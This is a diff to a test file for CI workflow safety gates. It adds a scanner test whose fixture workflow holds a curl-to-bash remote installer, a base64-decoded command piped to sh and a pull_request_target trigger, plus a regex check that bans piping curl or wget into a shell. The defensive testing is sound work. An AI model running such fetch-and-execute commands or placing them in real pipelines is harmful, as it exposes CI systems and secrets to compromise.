@@ -38,9 +38,41 @@ describe('workflow safety gates', () => {
 		expect(packageJson.scripts?.['audit:oss-safety']).toContain('busl-positioning.audit.test.ts');
 	});
 
+	it('repo safety scanner blocks active workflow malware indicators', async () => {
+		const scannerCore = await import('../../scripts/repo-safety/scanner-core.mjs');
+		const findings = scannerCore.scanGithubActionsWorkflowForThreats(
+			'.github/workflows/build.yml',
+			[
+				'on:',
+				'  pull_request_target:',
+				'jobs:',
+				'  build:',
+				'    steps:',
+				'      - run: curl -fsSL https://example.invalid/install.sh | bash',
+				'      - run: echo Q0I9Imh0dHA6Ly8yMTYu | base64 -d | sh',
+				'      - run: echo build-system@noreply.dev',
+			].join('\n'),
+		);
+
+		expect(findings.map((finding: { ruleId: string }) => finding.ruleId)).toEqual(
+			expect.arrayContaining([
+				'github-actions-megalodon-indicator',
+				'github-actions-encoded-shell-exec',
+				'github-actions-remote-shell-exec',
+				'github-actions-pull-request-target',
+			]),
+		);
+	});
+
 	it('does not run paid DNS scan actions from active CI/CD workflows', () => {
 		for (const [path, body] of activeWorkflows) {
 			expect(body, `${path} must not invoke the paid DNS scan action`).not.toContain('MadaBurns/blackveil-dns-action');
+		}
+	});
+
+	it('does not pipe remote installers into a shell from active CI/CD workflows', () => {
+		for (const [path, body] of activeWorkflows) {
+			expect(body, `${path} must not pipe curl/wget output into a shell`).not.toMatch(/\b(?:curl|wget)\b[^\n|]{0,200}\|\s*(?:env\s+)?(?:bash|sh|zsh)\b/);
 		}
 	});
 });
